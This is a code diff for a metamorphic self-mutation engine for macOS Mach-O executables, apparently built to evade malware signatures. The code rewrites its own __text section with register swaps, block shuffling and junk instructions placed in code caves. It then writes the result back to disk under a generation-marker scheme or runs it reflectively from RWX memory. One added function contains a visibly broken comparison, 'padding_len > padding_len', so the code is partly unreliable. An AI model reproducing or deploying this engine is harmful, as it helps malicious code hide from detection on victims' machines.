@@ -1,5 +1,6 @@
 #include <aether.h>
-
+ 
+static size_t g_marker_offset = NOFFSET__;
 static void clear_tx(context_t *ctx);
 static bool clear_mut(context_t *ctx);
 
@@ -13,7 +14,7 @@ static bool dsk_mut(context_t *ctx, const char *binary_path, uint64_t file_start
 static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size);
 #endif
 
-// Get ASLR slide for this image by asking dyld
+/* Get ASLR slide for this image by asking dyld */
 intptr_t img_slide(const struct mach_header_64 *hdr) {
     if (!hdr) return 0;
 
@@ -28,7 +29,7 @@ intptr_t img_slide(const struct mach_header_64 *hdr) {
     return 0;
 }
 
-// Translate VM address to file offset (walks segments, accounts for ASLR)
+/* Translate VM address to file offset */
 uint64_t vmoffst(const struct mach_header_64 *hdr, uint64_t addr) {  
     if (!hdr) return NOFFSET__;
 
@@ -54,7 +55,7 @@ uint64_t vmoffst(const struct mach_header_64 *hdr, uint64_t addr) {
     return NOFFSET__;
 }
 
-// Find __TEXT,__text section and fill out file/VM ranges
+/* Find __TEXT,__text section and fill out file/VM ranges */
 bool text_sec(const struct mach_header_64 *hdr, text_section_t *out) { 
     if (!hdr || !out) return false;
     memset(out, 0, sizeof(*out));
@@ -88,7 +89,7 @@ bool text_sec(const struct mach_header_64 *hdr, text_section_t *out) {
     return false;
 }
 
-// Grow buffer by doubling until it fits needed_size
+/* Grow buffer by doubling until it fits needed_size */
 bool Ampbuff(context_t *ctx, size_t needed_size) { 
     if (!ctx) return false;
     if (needed_size <= ctx->buffcap) return true;
@@ -111,12 +112,7 @@ bool Ampbuff(context_t *ctx, size_t needed_size) {
     return true;
 }
 
-/**
- * Does this look like real code?
- * 
- * not too much padding, instructions decode,
- * reasonable valid/invalid ratio.
- */
+/* Does this look like real code? Check padding, decode ratio */
 bool mach_O(const uint8_t *code, size_t size) {  
     if (!code || size < 16) return false;
 
@@ -149,12 +145,7 @@ bool mach_O(const uint8_t *code, size_t size) {
     return valid_instructions >= min_valid;
 }
 
-/**
- * Mark regions we shouldn't mutate
- * 
- * Protects critical functions (decoder, malloc ... plus first/last
- * quarters of code. avoid suicide.
- */
+/* Mark regions we shouldn't mutate first/last quarters */
 void crit_tap(struct mach_header_64 *hdr, uint64_t text_vm_start, 
              uint64_t *ranges, size_t *num_ranges, size_t codesz) 
 {
@@ -182,15 +173,20 @@ void crit_tap(struct mach_header_64 *hdr, uint64_t text_vm_start,
     ranges[2] = codesz - quarter;
     ranges[3] = codesz;
     *num_ranges = 2;
+    
+    /* Protect generation marker region if it exists */
+    if (g_marker_offset != NOFFSET__ && g_marker_offset < codesz) {
+        ranges[*num_ranges * 2] = g_marker_offset;
+        ranges[*num_ranges * 2 + 1] = g_marker_offset + 16;  
+        (*num_ranges)++;
+    }
 
-    // Protect critical functions if they're in our text section
     for (size_t i = 0; i < num_hooks && *num_ranges < (_CAPZ / 2); i++) {
         if (!hooks[i]) continue;
 
         uint64_t addr = (uint64_t)hooks[i];
         uint64_t off  = vmoffst(hdr, addr);
 
-        // Skip if not in our text section
         if (off == NOFFSET__ || off >= codesz) continue;
 
         bool covered = false;
@@ -213,7 +209,7 @@ void crit_tap(struct mach_header_64 *hdr, uint64_t text_vm_start,
     }
 }
 
-// Is this offset in a protected region?
+/* Is this offset in a protected region? */
 bool chk_prot(uint64_t offset, uint64_t *ranges, size_t num_ranges) { 
     if (!ranges || num_ranges == 0) return false;
     num_ranges = MIN(num_ranges, _CAPZ);
@@ -226,11 +222,7 @@ bool chk_prot(uint64_t offset, uint64_t *ranges, size_t num_ranges) {
     return false;
 }
 
-/**
- * Allocates buffers, seeds PRNG with system entropy, builds CFG,
- * marks protected regions, detects code caves. Everything needed
- * before we start mutating.
- */
+/* Setup mutation context allocate buffers, seed PRNG, build CFG */
 bool tx_Init(context_t *ctx, const uint8_t *code, size_t size,  
                 struct mach_header_64 *hdr, uint64_t text_vm_start) {
     if (!ctx || !code || size == 0 || !hdr) return false;
@@ -311,7 +303,7 @@ bool tx_Init(context_t *ctx, const uint8_t *code, size_t size,
         }
     }
 
-    DBG("tx_Init: size=%zu, blocks=%zu\n", ctx->codesz, ctx->cfg.num_blocks);
+    DBG("size=%zu, blocks=%zu\n", ctx->codesz, ctx->cfg.num_blocks);
     
     return true;
 }
@@ -330,10 +322,7 @@ static void clear_tx(context_t *ctx) {
     memset(ctx, 0, sizeof(*ctx));
 }
 
-/**
- * Decodes everything and checks valid/invalid ratio, padding ...
- * Simple integrity check after mutations.
- */
+/* Decode everything and check valid/invalid ratio */
 static bool clear_mut(context_t *ctx) { 
     if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;
 
@@ -376,7 +365,7 @@ static bool clear_mut(context_t *ctx) {
     return true;
 }
 
-// Register swapping + block shuffling
+/* Register swapping + block shuffling */
 static bool reg_mut(context_t *ctx, unsigned intensity) { 
     if (!ctx || !ctx->working_code || ctx->codesz == 0 || ctx->is_shellcode) return true;
 
@@ -408,12 +397,11 @@ static bool reg_mut(context_t *ctx, unsigned intensity) {
         if (offset + inst.len > ctx->codesz) break;
         pulse_live(&liveness, offset, &inst);
 
-        // Register mutation with higher probability
         if (inst.has_modrm && inst.len >= 2 && inst.len <= 8 &&
             offset >= start && offset < end &&
             !chk_prot(offset, ctx->ranges, ctx->numcheck) &&
             !inst.is_control_flow && !inst.modifies_ip &&
-            (chacha20_random(&ctx->rng) % 100) < (intensity * 20)) {  // Increased from 15 to 20
+            (chacha20_random(&ctx->rng) % 100) < (intensity * 20)) {
 
             uint8_t reg = (inst.modrm >> 3) & 7;
             uint8_t rm  = inst.modrm & 7;
@@ -499,11 +487,7 @@ static bool reg_mut(context_t *ctx, unsigned intensity) {
     return (changes > 0) || block_changed || intensity == 0;
 }
 
-
-/**
- * Looks for sequences of 0x00/0x90/0xCC that aren't part of real
- * instructions. These are cool to overwrite with junk.
- */
+/* Find code caves sequences of 0x00/0x90/0xCC padding */
 static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
     if (!ctx || !caves || !num_caves || ctx->codesz == 0) return false;
     
@@ -518,7 +502,6 @@ static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
         return false;
     }
     
-    // Mark instruction start positions
     bool *is_instr_start = calloc(ctx->codesz, sizeof(bool));
     if (!is_instr_start) {
         free(instrs);
@@ -531,16 +514,13 @@ static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
         }
     }
     
-    // Scan 
     size_t i = 0;
     while (i < ctx->codesz && *num_caves < _CVZ) {
-        // Skip if this is an instruction start
         if (is_instr_start[i]) {
             i++;
             continue;
         }
         
-        // Look for padding bytes 
         size_t pad_len = 0;
         size_t max_scan = MIN(ctx->codesz - i, 100);
         
@@ -553,7 +533,6 @@ static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
             }
         }
         
-        // Found a cave of at least PAD_ bytes
         if (pad_len >= PAD_) {
             bool valid_cave = true;
             for (size_t k = i; k < i + pad_len && k < ctx->codesz; k++) {
@@ -563,7 +542,6 @@ static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
                 }
             }
             
-            // Check it's not in a protected region
             if (valid_cave && !chk_prot(i, ctx->ranges, ctx->numcheck)) {
                 caves[(*num_caves) * 2]     = i;
                 caves[(*num_caves) * 2 + 1] = i + pad_len;
@@ -582,10 +560,7 @@ static bool cave_it(context_t *ctx, uint64_t *caves, int *num_caves) {
     return *num_caves > 0;
 }
 
-/**
- * Injects valid but useless instructions into padding regions.
- * Increases code diversity without changing behavior.
- */
+/* Inject valid but useless instructions into padding regions */
 static bool apply_jnk(context_t *ctx, unsigned intensity, size_t max_size) {
     if (!ctx || ctx->is_shellcode) return true;
 
@@ -607,7 +582,6 @@ static bool apply_jnk(context_t *ctx, unsigned intensity, size_t max_size) {
         if (chk_prot(offset, ctx->ranges, ctx->numcheck)) continue;
         if ((chacha20_random(&ctx->rng) % 10) >= (intensity * 3)) continue;
 
-        // Find if this offset is in a code cave
         uint64_t caves[_CVZ * 2];
         int num_caves = 0;
         if (!cave_it(ctx, caves, &num_caves)) continue;
@@ -651,7 +625,7 @@ static bool apply_jnk(context_t *ctx, unsigned intensity, size_t max_size) {
     return changes >= 0;
 }
 
-// In-place mutations (same size)
+/* In-place mutations (same size) */
 static bool jnk_fill(context_t *ctx, unsigned intensity) {
     if (!ctx || ctx->codesz == 0) return false;
 
@@ -664,69 +638,93 @@ static bool jnk_fill(context_t *ctx, unsigned intensity) {
     while (offset < ctx->codesz) {
         x86_inst_t inst;
         if (!decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &inst, NULL) || !inst.valid) {
-            offset++;continue;}
+            offset++;
+            continue;
+        }
 
-        if (offset < start || offset >= end) { offset += inst.len; continue; }
+        if (offset < start || offset >= end) { 
+            offset += inst.len; 
+            continue; 
+        }
+        
         if (chk_prot(offset, ctx->ranges, ctx->numcheck) || inst.is_control_flow) {
-            offset += inst.len;continue;}
+            offset += inst.len;
+            continue;
+        }
 
-        if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 10)) {  // Changed from % 30 and * 5
-            offset += inst.len; continue;}
+        if ((chacha20_random(&ctx->rng) % 100) >= (intensity * 10)) {
+            offset += inst.len; 
+            continue;
+        }
 
         uint8_t backup[16];
         memcpy(backup, ctx->working_code + offset, inst.len);
         bool mutated = false;
 
-        if (inst.len == 2 && inst.raw[0] == 0x89) {
-            // MOV reg, reg - swap registers
-            uint8_t r1 = chacha20_random(&ctx->rng) % 8;
-            uint8_t r2 = chacha20_random(&ctx->rng) % 8;
-            if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
-                ctx->working_code[offset]     = 0x89;
-                ctx->working_code[offset + 1] = 0xC0 | (r1 << 3) | r2;
-                mutated = true;
+        if (inst.len == 2 && inst.raw[0] == 0x89 && inst.has_modrm) {
+            uint8_t modrm = inst.raw[1];
+            uint8_t mod = (modrm >> 6) & 3;
+            
+            if (mod == 3) {
+                uint8_t r1 = chacha20_random(&ctx->rng) % 8;
+                uint8_t r2 = chacha20_random(&ctx->rng) % 8;
+                
+                // stack pointers and same-register
+                if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5 && r1 != r2) {
+                    ctx->working_code[offset]     = 0x89;
+                    ctx->working_code[offset + 1] = 0xC0 | (r1 << 3) | r2;
+                    mutated = true;
+                }
             }
-        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x89) {
-            // REX.W MOV reg, reg
-            uint8_t r1 = chacha20_random(&ctx->rng) % 8;
-            uint8_t r2 = chacha20_random(&ctx->rng) % 8;
-            if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
-                ctx->working_code[offset]     = 0x48;
-                ctx->working_code[offset + 1] = 0x89;
-                ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
-                mutated = true;
+        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x89 && inst.has_modrm) {
+            uint8_t modrm = inst.raw[2];
+            uint8_t mod = (modrm >> 6) & 3;
+            
+            if (mod == 3) {
+                uint8_t r1 = chacha20_random(&ctx->rng) % 8;
+                uint8_t r2 = chacha20_random(&ctx->rng) % 8;
+                
+                if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5 && r1 != r2) {
+                    ctx->working_code[offset]     = 0x48;
+                    ctx->working_code[offset + 1] = 0x89;
+                    ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
+                    mutated = true;
+                }
             }
-        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x31) {
-            // REX.W XOR reg, reg - swap registers
-            uint8_t r1 = chacha20_random(&ctx->rng) % 8;
-            uint8_t r2 = chacha20_random(&ctx->rng) % 8;
-            if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
-                ctx->working_code[offset]     = 0x48;
-                ctx->working_code[offset + 1] = 0x31;
-                ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
-                mutated = true;
+        } else if (inst.len == 3 && inst.raw[0] == 0x48 && inst.raw[1] == 0x31 && inst.has_modrm) {
+            uint8_t modrm = inst.raw[2];
+            uint8_t mod = (modrm >> 6) & 3;
+            
+            if (mod == 3) {
+                uint8_t r1 = chacha20_random(&ctx->rng) % 8;
+                uint8_t r2 = chacha20_random(&ctx->rng) % 8;
+                
+                if (r1 != 4 && r1 != 5 && r2 != 4 && r2 != 5) {
+                    ctx->working_code[offset]     = 0x48;
+                    ctx->working_code[offset + 1] = 0x31;
+                    ctx->working_code[offset + 2] = 0xC0 | (r1 << 3) | r2;
+                    mutated = true;
+                }
             }
         }
 
         if (mutated) {
             x86_inst_t test_inst;
-            if (!(decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) && test_inst.valid)) {
+            if (!(decode_x86_withme(ctx->working_code + offset, ctx->codesz - offset, 0, &test_inst, NULL) && 
+                  test_inst.valid && test_inst.len == inst.len)) {
                 memcpy(ctx->working_code + offset, backup, inst.len);
             } else {
                 changes++;
             }
         }
+        
         offset += inst.len > 0 ? inst.len : 1;
     }
 
     return changes > 0;
 }
 
-/** 
- * Runs expansion > mutations > register swaps > junk injection.
- * Keeps backup, validates after each phase, rolls back if needed.
- * Generation number controls intensity.
- */
+/* Main mutation pipeline expansion, mutations, register swaps, junk injection */
 bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {    
     if (!ctx || !ctx->working_code || ctx->codesz == 0) return false;
 
@@ -734,13 +732,11 @@ bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {
     size_t memory_limit = ctx->buffcap;
     bool memory_only = (ctx->codesz >= disk_limit);
     
-#ifdef FOO
-    // Disable expansions for disk mutation
-    // It's a simple byte-level sweep, nothing more.
+#ifdef FOO 
+    /* Disable expansions for disk mutation */
     size_t expansion_limit = 0;
     size_t growth_budget = 0;
 #else
-    // Allow expansions for in-memory mutation
     size_t expansion_limit = memory_only ? memory_limit : disk_limit;
     size_t growth_budget = (expansion_limit > ctx->codesz) ? (expansion_limit - ctx->codesz) : 0;
 #endif
@@ -768,7 +764,6 @@ bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {
     size_t max_expand_size = expansion_limit;
     
 #ifndef FOO
-    // Expansion enabled
     if (generation >= 5 && ctx->codesz < max_expand_size) {
         unsigned depth = 1 + (generation / 10);
         if (depth > 3) depth = 3;
@@ -816,13 +811,10 @@ bool mOrph(context_t *ctx, unsigned generation, size_t max_size) {
         mutate(ctx->working_code, ctx->codesz, &ctx->rng, generation, &engine_ctx);
     }
 
-    // Don't fail if no changes
     bool reg_success = reg_mut(ctx, intensity);
     bool jnk_success = jnk_fill(ctx, intensity);
     
-    // At least one mutation type should pass
     if (!reg_success && !jnk_success) {
-        // Try again 
         reg_success = reg_mut(ctx, intensity + 2);
         jnk_success = jnk_fill(ctx, intensity + 2);
         if (!reg_success && !jnk_success) {
@@ -912,10 +904,7 @@ static bool dsk_seg(context_t *ctx, size_t original_size) {
     return true;
 }
 
-/** 
- * Validates, writes, pads with NOPs if needed, reads back to verify.
- * Paranoid but necessary.
- */
+/* Validate, write to disk, pad with NOPs, read back to verify */
 static bool dsk_mut(context_t *ctx, const char *binary_path,  
                                uint64_t file_start, size_t original_size) {
     
@@ -940,7 +929,6 @@ static bool dsk_mut(context_t *ctx, const char *binary_path,
         return false;
     }
     
-    // Pad with NOPs if we wrote less than original
     if (write_size < original_size) {
         size_t pad_size = original_size - write_size;
         uint8_t *nop_pad = malloc(pad_size);
@@ -980,29 +968,18 @@ static bool dsk_mut(context_t *ctx, const char *binary_path,
 }
 
 #ifndef FOO
-/**
- * Apply mutations via reflective loading
- * 
- * This is the RELEASE mode path that uses reflective loading to execute
- * mutated code from memory without touching disk.
- * 
- * @param ctx: Mutation context with mutated code
- * @param text_base: Original runtime .text base
- * @param text_size: Original .text size
- * @return: true if successfully loaded and executed
- */
+/* Apply mutations via reflective loading RELEASE mode path */
 static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
     if (!ctx || !ctx->working_code || ctx->codesz == 0) {
         return false;
     }
     
-    (void)text_base;  // Unused in reflective mode
+    (void)text_base;
     
     DBG("  Original size: %zu bytes\n", text_size);
     DBG("  Mutated size:  %zu bytes\n", ctx->codesz);
     DBG("  Growth:        %.1f%%\n", 100.0 * (ctx->codesz - text_size) / text_size);
     
-    // Count actual mutations for verification
     size_t mutations_count = 0;
     size_t compare_size = MIN(ctx->codesz, text_size);
     for (size_t i = 0; i < compare_size; i++) {
@@ -1021,7 +998,6 @@ static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
         return false;
     }
     
-    // Wrap mutated code in Mach-O structure
     size_t macho_size = 0;
     uint8_t *macho_binary = wrap_macho(ctx->working_code, ctx->codesz, &macho_size);
     
@@ -1029,7 +1005,6 @@ static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
     
     DBG("Wrapped in Mach-O structure (%zu bytes)\n", macho_size);
     
-    // Verify
     if (!V_machO(macho_binary, macho_size)) {
         DBG("Mach-O verification failed\n");
         free(macho_binary);
@@ -1038,26 +1013,185 @@ static bool mem_mut(context_t *ctx, uint8_t *text_base, size_t text_size) {
     
     DBG("Mach-O V Passed\n");
     
-    // Load and execute reflectively
     bool success = exec_mem(macho_binary, macho_size);
     
     if (success) {
-        DBG("[+] Reflective loading successful\n"); // Use printf for verbose output in Release mode !!! 
-        DBG("[+] Mutated code executing from memory\n");
+        // 
     } else {
-        // Go Sideways
-        panic();
+        panic(); // Go Sideways
     }
     
-    // The loader has its own copy in RWX memory
     free(macho_binary);
     
     return success;
 }
 
-#endif  // !FOO
+#endif
+
+/* Find generation marker in code by scanning for magic value */
+static marker_t* find_marker(uint8_t *code, size_t size) {
+    if (size < sizeof(marker_t)) return NULL;
+    
+    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
+        /* Search for magic byte sequence */
+        if (memcmp(code + i, MORPH_MAGIC, 8) == 0) {
+            marker_t *marker = (marker_t *)(code + i);
+            /* Verify checksum simple XOR */
+            uint32_t expected = marker->generation ^ 0xAE7B;
+            if (marker->checksum == expected) {
+                return marker;
+            }
+        }
+    }
+    return NULL;
+}
+
+/* Embed generation marker in code */
+static size_t embed_marker(uint8_t *code, size_t size, uint32_t generation) {
+    marker_t new_marker;
+    memcpy(new_marker.magic, MORPH_MAGIC, 8);
+    new_marker.generation = generation;
+    new_marker.checksum = generation ^ 0xAE7B;
+    
+    /* Update existing marker if found */
+    marker_t *existing = find_marker(code, size);
+    if (existing) {
+        size_t offset = (uint8_t*)existing - code;
+        existing->generation = generation;
+        existing->checksum = generation ^ 0xAE7B;
+        DBG("[*] Updated existing marker at 0x%zx\n", offset);
+        return offset;
+    }
+    
+    /* Look for padding (0x90, 0x00, 0xCC) we need at least 16 contiguous bytes */
+    size_t padding_offset = NOFFSET__;
+    size_t padding_len = 0;
+    
+    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
+        size_t padding_len = 0;
+        for (size_t j = 0; j < size - i && j < 256; j++) {
+            uint8_t byte = code[i + j];
+            if (byte == 0x90 || byte == 0x00 || byte == 0xCC) {
+                padding_len++;
+            } else {
+                break;
+            }
+        }
+        
+        if (padding_len >= sizeof(marker_t)) {
+            if (padding_len > padding_len) {
+                padding_offset = i;
+                padding_len = padding_len;
+            }
+        }
+    }
+    
+    if (padding_offset != NOFFSET__) {
+        memcpy(code + padding_offset, &new_marker, sizeof(marker_t));
+        DBG("[*] Marker in %zu-byte at 0x%zx\n", padding_len, padding_offset);
+        return padding_offset;
+    }
+    
+    /* Look for any sequence of NOPs specifically */
+    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
+        bool all_nops = true;
+        for (size_t j = 0; j < sizeof(marker_t); j++) {
+            if (code[i + j] != 0x90) {
+                all_nops = false;
+                break;
+            }
+        }
+        if (all_nops) {
+            memcpy(code + i, &new_marker, sizeof(marker_t));
+            DBG("[*] Marker in NOP at 0x%zx\n", i);
+            return i;
+        }
+    }
+    
+    /* Look for alignment padding (int3 sequences) */
+    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
+        bool all_int3 = true;
+        for (size_t j = 0; j < sizeof(marker_t); j++) {
+            if (code[i + j] != 0xCC) {
+                all_int3 = false;
+                break;
+            }
+        }
+        if (all_int3) {
+            memcpy(code + i, &new_marker, sizeof(marker_t));
+            DBG("[*] Marker in INT3 at 0x%zx\n", i);
+            return i;
+        }
+    }
+    
+    /* Check end of section for full padding */
+    if (size >= sizeof(marker_t) + 64) {
+        /* Scan backwards from end looking for complete padding */
+        for (size_t offset = size - sizeof(marker_t); offset > size - 2048 && offset > 0; offset--) {
+            bool all_padding = true;
+            for (size_t j = 0; j < sizeof(marker_t); j++) {
+                uint8_t byte = code[offset + j];
+                if (byte != 0x00 && byte != 0x90 && byte != 0xCC) {
+                    all_padding = false;
+                    break;
+                }
+            }
+            
+            if (all_padding) {
+                memcpy(code + offset, &new_marker, sizeof(marker_t));
+                DBG("[*] Marker near end at 0x%zx\n", offset);
+                return offset;
+            }
+        }
+    }
+    
+    /* Look for smaller padding and use NOPs to fill */
+    for (size_t i = 0; i <= size - sizeof(marker_t); i++) {
+        /* Look for at least 8 consecutive padding bytes */
+        size_t padding_count = 0;
+        for (size_t j = 0; j < sizeof(marker_t); j++) {
+            uint8_t byte = code[i + j];
+            if (byte == 0x00 || byte == 0x90 || byte == 0xCC) {
+                padding_count++;
+            }
+        }
+        
+        if (padding_count >= 8) {
+            /* Fill entire region with NOPs first, then embed marker */
+            memset(code + i, 0x90, sizeof(marker_t));
+            memcpy(code + i, &new_marker, sizeof(marker_t));
+            DBG("[*] Marker with NOP fill at 0x%zx (%zu bytes)\n", i, padding_count);
+            return i;
+        }
+    }
+    /* Can't find a place for the marker, so mutate the hell out of this binary until something breaks. */
+    return NOFFSET__;
+}
+
+/* Check if we reached max mutation depth */
+static bool check_generation(uint8_t *code, size_t size, uint32_t *current_gen) {
+    marker_t *marker = find_marker(code, size);
+    
+    if (!marker) {
+        /* Virgin */
+        *current_gen = 0;
+        return true;
+    }
+    
+    *current_gen = marker->generation;
+    
+    if (marker->generation >= MX_GEN) {
+        return false;  /* Max generations reached */
+    }
+    
+    return true;
+}
 
 int mutator(void) {
+    /* Only mutate once per process lifetime */
+    static bool mutation_done = false;
+    if (mutation_done) {return 0;}
+    
     char pathbuf[PATH_MAX];
     uint32_t psize = sizeof(pathbuf);
     if (_NSGetExecutablePath(pathbuf, &psize) != 0) return 1;
@@ -1069,11 +1203,10 @@ int mutator(void) {
     
     size_t text_size = (size_t)(tsec.file_end - tsec.file_start);
     
-    // Get the ACTUAL runtime address with ASLR slide
     intptr_t slide = img_slide(mh);
     uint8_t *runtime_text_base = (uint8_t *)(tsec.vm_start + slide);
     
-    DBG("Text section: file=0x%llx-0x%llx, vm=0x%llx-0x%llx, slide=0x%lx, runtime=%p\n",
+    DBG("file=0x%llx-0x%llx, vm=0x%llx-0x%llx, slide=0x%lx, runtime=%p\n",
         tsec.file_start, tsec.file_end, tsec.vm_start, tsec.vm_end, slide, runtime_text_base);
     
     int fd = open(pathbuf, O_RDONLY);
@@ -1090,6 +1223,33 @@ int mutator(void) {
     }
     close(fd);
     
+    /* Check generation marker in code */
+    uint32_t current_gen = 0;
+    if (!check_generation(original_text, text_size, &current_gen)) {
+        DBG("[*] Generations (%u) reached, No mutation\n", MX_GEN);
+        free(original_text);
+        return 0;
+    }
+    
+    DBG("[*] Generation: %u/%u\n", current_gen, MX_GEN);
+    
+    /* Embed initial marker in virgin binary*/
+    if (current_gen == 0) {
+        g_marker_offset = embed_marker(original_text, text_size, 0);
+        if (g_marker_offset != NOFFSET__) {
+            DBG("[*] Initial marker at offset 0x%zx\n", g_marker_offset);
+        } else {
+            DBG("[!] Can't embed marker\n");
+        }
+    } else {
+        /* Marker location */
+        marker_t *marker = find_marker(original_text, text_size);
+        if (marker) {
+            g_marker_offset = (uint8_t*)marker - original_text;
+            DBG("[*] Found Marker at offset 0x%zx\n", g_marker_offset);
+        }
+    }
+    
     context_t ctx;
     if (!tx_Init(&ctx, original_text, text_size, mh, tsec.vm_start)) {
         free(original_text);
@@ -1103,11 +1263,11 @@ int mutator(void) {
         return 1;
     }
     
-    unsigned max_generations = 3 + (chacha20_random(&ctx.rng) % 3);
+    unsigned max_generations = 2 + (chacha20_random(&ctx.rng) % 3);
     bool success = false;
     bool mutated = false;
     
-    for (unsigned gen = 1; gen <= max_generations; gen++) {
+    for (unsigned gen = 1; gen <= MX_GEN; gen++) {
         memcpy(backup, ctx.working_code, MIN(ctx.codesz, text_size));
         size_t backup_size = ctx.codesz;
         
@@ -1123,42 +1283,54 @@ int mutator(void) {
     }
     
     if (mutated) {
-        DBG("Generations: %u\n", max_generations);
+        DBG("Generations: %u\n", MX_GEN);
+        
+        mutation_done = true;
         
 #ifdef FOO
         if (ctx.codesz <= text_size) {
+            /* Update */
+            size_t marker_offset = embed_marker(ctx.working_code, ctx.codesz, current_gen + 1);
+            if (marker_offset != NOFFSET__) {
+                DBG("[*] Updated marker: %u -> %u (offset 0x%zx)\n", 
+                    current_gen, current_gen + 1, marker_offset);
+            } else {
+                DBG("[!] Failed to update\n");
+            }
+            
             success = dsk_mut(&ctx, pathbuf, tsec.file_start, text_size);
             
             if (success) {
-                // pass 
+                DBG("[+] Mutation Passed (gen %u -> %u)\n", current_gen, current_gen + 1);
             } else {
-                DBG("[!] Mutation faild\n");
+                DBG("[!] Mutation failed\n");
+                panic();
             }
         } else {
-            DBG("[!] Cannot size increased (%zu > %zu)\n", 
+            DBG("[!] Cannot write size increased (%zu > %zu)\n", 
                 ctx.codesz, text_size);
             success = false;
         }
 #else
-        // Reflective loading expansion allowed
         if (!is_chunk_ok(ctx.working_code, ctx.codesz)) {
-            DBG("[!] Mutated code failed validation\n");
+            DBG("[!] Code failed validation\n");
             DBG("   Rolling back to original code\n");
             success = false;
         } else {
-            DBG("[+] Mutated code validated\n");
+            DBG("[+] Code validated\n"); 
             DBG("Attempting reflective load...\n");
             
             success = mem_mut(&ctx, runtime_text_base, text_size);
             
             if (!success) {
                 DBG("[!] Loading failed\n");
+                panic();
             }
         }
 #endif
     } else {
         // This is a bad
-        DBG("[!]No mutations after %u generations\n", max_generations);
+        DBG("[!] No mutations after %u generations\n", MX_GEN);
         panic();
     }
 
